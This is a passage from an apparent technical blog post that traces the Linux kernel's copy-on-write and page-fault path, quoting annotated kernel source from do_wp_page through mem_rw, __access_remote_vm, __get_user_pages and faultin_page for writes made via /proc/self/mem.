management,</span></span><br><span class="line"><span class="comment">// so they won&#x27;t have their own `page` struct</span></span><br><span class="line"><span class="comment">// (e.g. KSM pages)</span></span><br><span class="line">old_page = vm_normal_page(vma, address, orig_pte);</span><br><span class="line"><span class="keyword">if</span> (!old_page) &#123;<span class="comment">// it&#x27;s a special mapping page</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a</span></span><br><span class="line"><span class="comment">	 * VM_PFNMAP VMA.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * We should not cow pages in a shared writeable mapping.</span></span><br><span class="line"><span class="comment">	 * Just mark the pages writable and/or call ops-&gt;pfn_mkwrite.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">			     (VM_WRITE|VM_SHARED))</span><br><span class="line">		<span class="keyword">return</span> wp_pfn_shared(mm, vma, address, page_table, ptl,</span><br><span class="line">				     orig_pte, pmd);</span><br><span class="line"></span><br><span class="line">	pte_unmap_unlock(page_table, ptl);</span><br><span class="line">	<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">			    orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>For normal page, if it’s an anonymous page(not related to a file, e.g. stack and heap), then check for the mapping times, if it’s 1, just mark the page writable is okay.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Take out anonymous pages first, anonymous shared vmas are</span></span><br><span class="line"><span class="comment"> * not dirty accountable.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (PageAnon(old_page) &amp;&amp; !PageKsm(old_page)) &#123;<span class="comment">//it&#x27;s an anonymous page &amp;&amp; not ksm</span></span><br><span class="line">	<span class="keyword">if</span> (!trylock_page(old_page)) &#123;</span><br><span class="line">		page_cache_get(old_page);</span><br><span class="line">		pte_unmap_unlock(page_table, ptl);</span><br><span class="line">		lock_page(old_page);</span><br><span class="line">		page_table = pte_offset_map_lock(mm, pmd, address,</span><br><span class="line">						 &amp;ptl);</span><br><span class="line">		<span class="keyword">if</span> (!pte_same(*page_table, orig_pte)) &#123;</span><br><span class="line">			unlock_page(old_page);</span><br><span class="line">			pte_unmap_unlock(page_table, ptl);</span><br><span class="line">			page_cache_release(old_page);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		page_cache_release(old_page);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// check wthere there&#x27;s only one process is using the page (by reuse_swap_page())</span></span><br><span class="line">	<span class="comment">// if so, just reuse the page is okay</span></span><br><span class="line">	<span class="keyword">if</span> (reuse_swap_page(old_page)) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * The page is all ours.  Move it to our anon_vma so</span></span><br><span class="line"><span class="comment">		 * the rmap code will not search our parent or siblings.</span></span><br><span class="line"><span class="comment">		 * Protected against the rmap code by the page lock.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		page_move_anon_rmap(old_page, vma, address);</span><br><span class="line">		unlock_page(old_page);</span><br><span class="line">		<span class="comment">// just mark the page writable</span></span><br><span class="line">		<span class="keyword">return</span> wp_page_reuse(mm, vma, address, page_table, ptl,</span><br><span class="line">				     orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	unlock_page(old_page);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely((vma-&gt;vm_flags &amp; (VM_WRITE|VM_SHARED)) ==</span><br><span class="line">				(VM_WRITE|VM_SHARED))) &#123;</span><br><span class="line">	<span class="keyword">return</span> wp_page_shared(mm, vma, address, page_table, pmd,</span><br><span class="line">			      ptl, orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>After all conditions above are eliminated, it comes the time to do the copy-on-write. We allocate a new page there and copy the content from the old page across <code>wp_page_copy()</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ok, we need to copy. Oh, well..</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	page_cache_get(old_page);</span><br><span class="line"></span><br><span class="line">	pte_unmap_unlock(page_table, ptl);</span><br><span class="line">	<span class="comment">// copy the page now</span></span><br><span class="line">	<span class="keyword">return</span> wp_page_copy(mm, vma, address, page_table, pmd,</span><br><span class="line">			    orig_pte, old_page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-COW-while-writing-to-x2F-proc-x2F-self-x2F-mem"><a href="#3-COW-while-writing-to-x2F-proc-x2F-self-x2F-mem" class="headerlink" title="3. COW while writing to &#x2F;proc&#x2F;self&#x2F;mem"></a>3. COW while writing to &#x2F;proc&#x2F;self&#x2F;mem</h2><p>So when we use <code>mmap()</code> to map a read-only file, and use the <code>/proc/self/mem</code> to write directly on the mmap area, the control flow is as below:</p>
<h3 id="SYSCALL-writeのflow"><a href="#SYSCALL-writeのflow" class="headerlink" title="SYSCALL: writeのflow"></a>SYSCALL: writeのflow</h3><p>Syscall <code>write()</code> will called the <code>sys_write()</code> in kernel, which defined in  <code>fs/read_write.c</code> :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(write, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">const</span> <span class="type">char</span> __user *, buf,</span><br><span class="line">		<span class="type">size_t</span>, count)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget_pos(fd);</span><br><span class="line">	<span class="type">ssize_t</span> ret = -EBADF;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (f.file) &#123;</span><br><span class="line">		<span class="type">loff_t</span> pos = file_pos_read(f.file);</span><br><span class="line">		ret = vfs_write(f.file, buf, count, &amp;pos);</span><br><span class="line">		<span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line">			file_pos_write(f.file, pos);</span><br><span class="line">		fdput_pos(f);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This function will finally call the specific <code>write()</code> function of the <code>file</code> struct’s <code>file_operations</code> table.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">	sys_write()</span><br><span class="line">		vfs_write()</span><br><span class="line">			__vfs_write()</span><br><span class="line">				file-&gt;f_op-&gt;write()</span><br></pre></td></tr></table></figure>

<p>For <code>/proc/self/mem</code>, it will be the <code>mem_write()</code>, and the core of this function is <code>mem_rw()</code> in fact, which defined in <code>fs/proc/base.c</code> . It’ll allocate a temporary page to copy the data, and do the real operation by <code>access_remote_vm()</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">mem_rw</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">char</span> __user *buf,</span></span><br><span class="line"><span class="params">			<span class="type">size_t</span> count, <span class="type">loff_t</span> *ppos, <span class="type">int</span> write)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> file-&gt;private_data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> addr = *ppos;</span><br><span class="line">	<span class="type">ssize_t</span> copied;</span><br><span class="line">	<span class="type">char</span> *page;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!mm)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// allocate temp page</span></span><br><span class="line">	page = (<span class="type">char</span> *)__get_free_page(GFP_TEMPORARY);</span><br><span class="line">	<span class="keyword">if</span> (!page)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	copied = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))</span><br><span class="line">		<span class="keyword">goto</span> <span class="built_in">free</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="type">int</span> this_len = <span class="type">min_t</span>(<span class="type">int</span>, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy the data from userspace to the temp page firstly</span></span><br><span class="line">		<span class="keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;</span><br><span class="line">			copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// core: access_remote_vm()</span></span><br><span class="line">		this_len = access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="line">		<span class="keyword">if</span> (!this_len) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!copied)</span><br><span class="line">				copied = -EIO;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// if the operation is read, temp page has the data we need now, just copy back</span></span><br><span class="line">		<span class="keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">			copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		buf += this_len;</span><br><span class="line">		addr += this_len;</span><br><span class="line">		copied += this_len;</span><br><span class="line">		count -= this_len;</span><br><span class="line">	&#125;</span><br><span class="line">	*ppos = addr;</span><br><span class="line"></span><br><span class="line">	mmput(mm);</span><br><span class="line"><span class="built_in">free</span>:</span><br><span class="line">	free_page((<span class="type">unsigned</span> <span class="type">long</span>) page);</span><br><span class="line">	<span class="keyword">return</span> copied;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>mem_rw()</code> is a function that consists of operation of both reading and writing. The core of read&#x2F;write operation is in  <code>access_remote_vm()</code> , and it’ll call <code>__access_remote_vm()</code> defined in  <code>mm/memory.c</code> :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Access another process&#x27; address space as given in mm.  If non-NULL, use the</span></span><br><span class="line"><span class="comment"> * given task for page fault accounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __access_remote_vm(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> mm_struct *mm,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">void</span> *buf, <span class="type">int</span> len, <span class="type">int</span> write)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="type">void</span> *old_buf = buf;</span><br><span class="line"></span><br><span class="line">	down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	<span class="comment">/* ignore errors, just check how much was successfully transferred */</span></span><br></pre></td></tr></table></figure>

<p>It’s core is using a loop to copy the data page by page. Firstly it’ll try to get the destination page’s <code>page struct</code> by <code>get_user_pages()</code>. If it failed to get the page, it’ll find out the vma that the target address belongs and call the <code>vma-&gt;vm_ops-&gt;access()</code> to hande it.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">while</span> (len) &#123;</span><br><span class="line">		<span class="type">int</span> bytes, ret, offset;</span><br><span class="line">		<span class="type">void</span> *maddr;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">		ret = get_user_pages(tsk, mm, addr, <span class="number">1</span>,</span><br><span class="line">				write, <span class="number">1</span>, &amp;page, &amp;vma);</span><br><span class="line">		<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Check if this is a VM_IO | VM_PFNMAP VMA, which</span></span><br><span class="line"><span class="comment">			 * we can access using slightly different code.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			vma = find_vma(mm, addr);</span><br><span class="line">			<span class="keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)</span><br><span class="line">				ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,</span><br><span class="line">							  len, write);</span><br><span class="line">			<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			bytes = ret;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>If it successfully gets the <code>page struct</code>, it’ll use <code>kmap()</code> to map the page to a writable virtual address space temporarily in <code>highmem</code> area so that we can read&#x2F;write the page frame by it’s virtual address that we just mapped. Then it comes to the real read&#x2F;write time.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			bytes = len;</span><br><span class="line">			offset = addr &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">			<span class="keyword">if</span> (bytes &gt; PAGE_SIZE-offset)</span><br><span class="line">				bytes = PAGE_SIZE-offset;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// map the page to highmem by kmap()</span></span><br><span class="line">			maddr = kmap(page);</span><br><span class="line">			<span class="keyword">if</span> (write) &#123;</span><br><span class="line">				copy_to_user_page(vma, page, addr,</span><br><span class="line">						  maddr + offset, buf, bytes); <span class="comment">// write to page</span></span><br><span class="line">				set_page_dirty_lock(page);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				copy_from_user_page(vma, page, addr,</span><br><span class="line">						    buf, maddr + offset, bytes); <span class="comment">// read from page</span></span><br><span class="line">			&#125;</span><br><span class="line">			kunmap(page);	<span class="comment">// unmap the page</span></span><br><span class="line">			page_cache_release(page);</span><br><span class="line">		&#125;</span><br><span class="line">		len -= bytes;</span><br><span class="line">		buf += bytes;</span><br><span class="line">		addr += bytes;</span><br><span class="line">	&#125;</span><br><span class="line">	up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> buf - old_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>So let’s look at how it get the page by <code>get_user_pages()</code> now. It’ll finally call the <code>__get_user_pages_locked()</code> and the <code>__get_user_pages()</code> will be called, which defined in <code>mm/gup.c</code>. It mainly use a big loop to handle everything:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> __get_user_pages(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> mm_struct *mm,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> start, <span class="type">unsigned</span> <span class="type">long</span> nr_pages,</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> gup_flags, <span class="keyword">struct</span> page **pages,</span><br><span class="line">		<span class="keyword">struct</span> vm_area_struct **vmas, <span class="type">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">long</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> page_mask;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!nr_pages)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	VM_BUG_ON(!!pages != !!(gup_flags &amp; FOLL_GET));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If FOLL_FORCE is set then do not force a full fault as the hinting</span></span><br><span class="line"><span class="comment">	 * fault information is unrelated to the reference behaviour of a task</span></span><br><span class="line"><span class="comment">	 * using the address space</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!(gup_flags &amp; FOLL_FORCE))</span><br><span class="line">		gup_flags |= FOLL_NUMA;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> foll_flags = gup_flags;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> page_increm;</span><br></pre></td></tr></table></figure>

<p>We mainly focus on the core in this loop. It’ll firstly use the <code>follow_page_mask()</code> to get the<code>page struct</code> of target virtual address. If it failed, it means that we cannot access the page frame right now. There’re two reasons for this:</p>
<ul>
<li>There’s no a physical page frame for this virtual address.</li>
<li>We don’t have the permission to access the page now.(e.g. we’re trying to write an unwritable page)</li>
</ul>
<p>For this condition, which presents a “page fault”, the program will call the <code>faultin_page()</code> to handle this.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">		<span class="comment">//...</span></span><br><span class="line">retry:</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span></span><br><span class="line"><span class="comment">		 * potentially allocating memory.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(fatal_signal_pending(current)))</span><br><span class="line">			<span class="keyword">return</span> i ? i : -ERESTARTSYS;</span><br><span class="line">		cond_resched();</span><br><span class="line">		<span class="comment">//get the `page` struct of virtual address&#x27; physical page frame</span></span><br><span class="line">		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);</span><br><span class="line">		<span class="keyword">if</span> (!page) &#123;<span class="comment">// &quot;page fault&quot;</span></span><br><span class="line">			<span class="type">int</span> ret;</span><br><span class="line">			ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">					nonblocking);</span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> retry;<span class="comment">//successfully to handle page fault, retry our operation</span></span><br><span class="line">			<span class="keyword">case</span> -EFAULT:</span><br><span class="line">			<span class="keyword">case</span> -ENOMEM:</span><br><span class="line">			<span class="keyword">case</span> -EHWPOISON:</span><br><span class="line">				<span class="keyword">return</span> i ? i : ret;</span><br><span class="line">			<span class="keyword">case</span> -EBUSY:</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			<span class="keyword">case</span> -ENOENT:</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line">			BUG();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>For copy-on-write, it’ll be like this:</p>
<ul>
<li><p>When we tried to access a page firstly, there’s no physical page frame for it (lazy kernel will only create the <code>vm_area_struct</code> at the beginning, the page will be allocated only when it’s accessed), so the  <code>follow_page_mask()</code> returns a NULL, representing a page fault. Then the program will use  <code>faultin_page()</code> to handle it and the physical page frame will be allocated.</p>
</li>
<li><p>Then it’ll be back to the tag <code>retry</code> and recall the <code>follow_page_mask()</code> . If we’re trying to write on an unwritable page, the <code>follow_page_mask()</code> will return a NULL again, representing a page fault. Then the program will use  <code>faultin_page()</code> to do the copy-on-write.</p>
</li>
</ul>
<blockquote>
<p>&#x2F;proc&#x2F;self&#x2F;mem represents the whole memory of a process, and it’s always writable for the process. So it won’t make the SIGSEGV while writing on a read-only mapped page, but the copy-on-write will be done.</p>
</blockquote>
<p>So the whole chain is as below:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mem_rw()</span><br><span class="line">	__get_free_page()</span><br><span class="line">	access_remote_vm()</span><br><span class="line">		__access_remote_vm()</span><br><span class="line">			get_user_pages()</span><br><span class="line">				__get_user_pages_locked()</span><br><span class="line">					__get_user_pages()</span><br><span class="line">						follow_page_mask()</span><br><span class="line">						faultin_page()</span><br></pre></td></tr></table></figure>

<p>Then let’s have a look at the <code>faultin_page()</code> .</p>
<h3 id="First-time-of-page-fault"><a href="#First-time-of-page-fault" class="headerlink" title="First time of page fault"></a>First time of page fault</h3><p>When we tried to access a page firstly, there’s no physical page frame for it (lazy kernel will only create the <code>vm_area_struct</code> at the beginning, the page will be allocated only when it’s accessed), so the  <code>follow_page_mask()</code> returns a NULL, representing a page fault. Then the program will use  <code>faultin_page()</code> to handle it, which defined in  <code>mm/gup.c</code> :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">faultin_page</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk, <span class="keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">unsigned</span> <span class="type">int</span> *flags, <span class="type">int</span> *nonblocking)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	ret = handle_mm_fault(mm, vma, address, fault_flags);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span></span><br><span class="line"><span class="comment">	 * necessary, even if maybe_mkwrite decided not to set pte_write. We</span></span><br><span class="line"><span class="comment">	 * can thus safely do subsequent page lookups as if they were reads.</span></span><br><span class="line"><span class="comment">	 * But only do so when looping for pte_write is futile: in some cases</span></span><br><span class="line"><span class="comment">	 * userspace may also be wanting to write to the gotten user page,</span></span><br><span class="line"><span class="comment">	 * which a read fault here might prevent (a readonly page might get</span></span><br><span class="line"><span class="comment">	 * reCOWed by userspace write).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It finally call the <code>handle_mm_fault()</code> to handle the page fault as below:</p>
